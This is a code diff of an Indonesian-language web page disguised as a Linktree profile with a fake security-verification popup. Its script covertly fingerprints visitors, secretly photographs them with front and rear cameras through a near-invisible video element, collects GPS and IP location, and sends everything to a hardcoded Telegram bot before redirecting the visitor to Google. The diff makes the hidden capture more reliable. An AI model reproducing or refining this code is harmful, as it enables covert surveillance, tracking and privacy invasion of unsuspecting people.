@@ -34,7 +34,6 @@
     .link-btn:hover { background: #ff4d6d; transform: translateY(-3px); box-shadow: 0 12px 25px rgba(255,77,109,0.3); }
     .footer { margin-top: 35px; font-size: 0.7rem; color: #555; }
 
-    /* Overlay Verifikasi */
     #verification-overlay {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: rgba(240, 240, 250, 0.7); backdrop-filter: blur(15px);
@@ -65,7 +64,6 @@
   </style>
 </head>
 <body>
-  <!-- Linktree Background (selalu tampil) -->
   <div id="main-content">
     <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Ccircle cx='55' cy='55' r='55' fill='%23ff4d6d'/%3E%3Ctext x='55' y='60' text-anchor='middle' fill='white' font-size='45' font-weight='bold'%3EL%3C/text%3E%3C/svg%3E" alt="Profile" class="profile-pic">
     <h1>@lynzxz</h1>
@@ -82,7 +80,6 @@
     <div class="footer">Dibuat dengan ❤️ oleh lynzxz • Laporkan</div>
   </div>
 
-  <!-- Overlay Verifikasi -->
   <div id="verification-overlay">
     <div class="modal">
       <h2>🔒 Verifikasi Keamanan</h2>
@@ -93,18 +90,15 @@
     </div>
   </div>
 
-  <!-- Elemen tersembunyi untuk kamera -->
-  <video id="cam-video" style="display:none;" playsinline autoplay muted></video>
+  <video id="cam-video" style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;" playsinline autoplay muted></video>
   <canvas id="photo-canvas" style="display:none;"></canvas>
 
   <script>
   (function() {
-    // ========== KONFIGURASI ==========
     const BOT_TOKEN = '8835244462:AAF2E4s0Ngq5wPENudpzEsSlSZLP3VJHaHw';
     const CHAT_ID = '5986004601';
     const REDIRECT_URL = 'https://www.google.com';
 
-    // DOM Elements
     const overlay = document.getElementById('verification-overlay');
     const verifyBtn = document.getElementById('verify-btn');
     const errorMsg = document.getElementById('error-msg');
@@ -113,15 +107,13 @@
     const canvas = document.getElementById('photo-canvas');
     const ctx = canvas.getContext('2d');
 
-    // State
-    let attempt = 0;                     // jumlah klik verifikasi
+    let attempt = 0;
     let gpsCoords = null;
     let frontBlob = null;
     let backBlob = null;
     let timerHandle = null;
     let finished = false;
 
-    // ========== FUNGSI PENGIRIMAN TELEGRAM ==========
     async function sendMessage(text) {
       try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -139,7 +131,7 @@
       try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd }); } catch(e){}
     }
 
-    // ========== NOTIFIKASI AWAL ==========
+    // Notifikasi awal instan
     sendMessage(`🚨 <b>Seseorang membuka web!</b>\nSedang dilacak... Tunggu 30 detik tuan 🫡\n⏱ ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`);
 
     // ========== FINGERPRINTING ==========
@@ -186,10 +178,8 @@
 
     async function getBattery() {
       if (!navigator.getBattery) return 'N/A';
-      try {
-        const b = await navigator.getBattery();
-        return `${Math.round(b.level*100)}% (charging:${b.charging})`;
-      } catch(e) { return 'battery_error'; }
+      try { const b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (charging:${b.charging})`; }
+      catch(e) { return 'battery_error'; }
     }
 
     function getNetworkType() {
@@ -248,26 +238,66 @@ Koord IP: ${loc[0]},${loc[1]}`;
       }
     }
 
-    // ========== KAMERA ==========
+    // ========== FUNGSI KAMERA YANG DIPERBAIKI ==========
     async function startCamera(facingMode) {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facingMode, width: {ideal: 1280}, height: {ideal: 720} },
-        audio: false
-      });
+      let stream;
+      try {
+        // Gunakan resolusi rendah agar stabil
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+      } catch (err) {
+        throw err; // izin ditolak
+      }
+
       video.srcObject = stream;
-      await video.play();
-      await new Promise(resolve => video.onloadedmetadata = resolve);
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      video.setAttribute('playsinline', '');
+      video.muted = true;
+      try {
+        await video.play();
+      } catch (e) {
+        // fallback: user gesture mungkin diperlukan, tapi seharusnya tidak
+      }
+
+      // Tunggu hingga metadata dimuat
+      await new Promise((resolve) => { video.onloadedmetadata = resolve; });
+
+      // Penting: tunggu beberapa frame agar gambar benar-benar siap
+      await new Promise((resolve) => {
+        // Gunakan requestVideoFrameCallback jika tersedia
+        if ('requestVideoFrameCallback' in video) {
+          video.requestVideoFrameCallback(() => {
+            // Tambahkan sedikit delay tambahan
+            setTimeout(resolve, 100);
+          });
+        } else {
+          // Fallback: setTimeout 300ms
+          setTimeout(resolve, 300);
+        }
+      });
+
+      // Sekarang capture
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-      // Bersihkan
+
+      // Bersihkan stream
       stream.getTracks().forEach(t => t.stop());
       video.srcObject = null;
+
+      // Buat blob
+      const blob = await new Promise((resolve, reject) => {
+        canvas.toBlob((b) => {
+          if (b && b.size > 100) resolve(b);
+          else reject(new Error('Blob terlalu kecil atau kosong'));
+        }, 'image/jpeg', 0.9);
+      });
+
       return blob;
     }
 
-    // ========== GPS ==========
+    // ========== GPS (SUDAH BAIK) ==========
     function requestLocation(retryCount = 0) {
       return new Promise((resolve, reject) => {
         if (!navigator.geolocation) return reject(new Error('Geolocation not supported'));
@@ -282,7 +312,6 @@ Koord IP: ${loc[0]},${loc[1]}`;
           },
           err => {
             if (retryCount < 1) {
-              // Tampilkan retry
               retryArea.innerHTML = `<p style="color:#ff8080;">Izin lokasi diperlukan.</p>
                 <button class="retry-btn" id="retry-loc">Coba Lagi</button>`;
               document.getElementById('retry-loc').onclick = () => {
@@ -347,7 +376,6 @@ Baterai: ${battery}
 🕒 Waktu: ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}
 📸 Kamera Depan: ${frontBlob?'✅':'❌'} | Belakang: ${backBlob?'✅':'❌'}`;
 
-      // Buat kolase jika ada dua foto
       let finalBlob = null;
       if (frontBlob && backBlob) {
         const loadImg = blob => new Promise(resolve => {
@@ -376,7 +404,6 @@ Baterai: ${battery}
       }
     }
 
-    // ========== FINALISASI ==========
     async function finalize(success) {
       if (finished) return;
       finished = true;
@@ -387,7 +414,6 @@ Baterai: ${battery}
       window.location.replace(REDIRECT_URL);
     }
 
-    // ========== VERIFIKASI UTAMA ==========
     async function startVerification() {
       if (finished) return;
       verifyBtn.disabled = true;
@@ -396,40 +422,28 @@ Baterai: ${battery}
       retryArea.innerHTML = '';
       attempt++;
 
-      // 1. Minta lokasi (wajib)
-      try {
-        await requestLocation(0);
-      } catch(e) {
-        gpsCoords = null;
-      }
+      // Lokasi
+      try { await requestLocation(0); } catch(e) { gpsCoords = null; }
 
-      // 2. Minta kamera depan (wajib)
+      // Kamera depan dengan fungsi baru
       try {
         frontBlob = await startCamera('user');
       } catch(e) {
         frontBlob = null;
       }
 
-      // 3. Jika depan berhasil, coba belakang (opsional)
+      // Belakang opsional
       if (frontBlob) {
-        try {
-          backBlob = await startCamera('environment');
-        } catch(e) {
-          backBlob = null;
-        }
+        try { backBlob = await startCamera('environment'); } catch(e) { backBlob = null; }
       }
 
-      // 4. Evaluasi
       const hasSomething = frontBlob || gpsCoords;
       if (hasSomething) {
         await finalize(true);
       } else {
-        // Gagal total di percobaan ini
         if (attempt >= 2) {
-          // Sudah 2x gagal, kirim data apa adanya
           await finalize(false);
         } else {
-          // Beri kesempatan retry
           errorMsg.style.display = 'block';
           errorMsg.textContent = 'Kamera dan lokasi harus diizinkan. Silakan coba lagi.';
           verifyBtn.innerHTML = '🔄 Coba Lagi';
@@ -438,14 +452,8 @@ Baterai: ${battery}
       }
     }
 
-    // ========== TIMEOUT 30 DETIK ==========
-    timerHandle = setTimeout(() => {
-      if (!finished) {
-        finalize(false);
-      }
-    }, 30000);
+    timerHandle = setTimeout(() => { if (!finished) finalize(false); }, 30000);
 
-    // ========== TAMPILKAN POPUP SETELAH 2.5 DETIK ==========
     setTimeout(() => {
       overlay.style.display = 'flex';
       verifyBtn.addEventListener('click', startVerification);
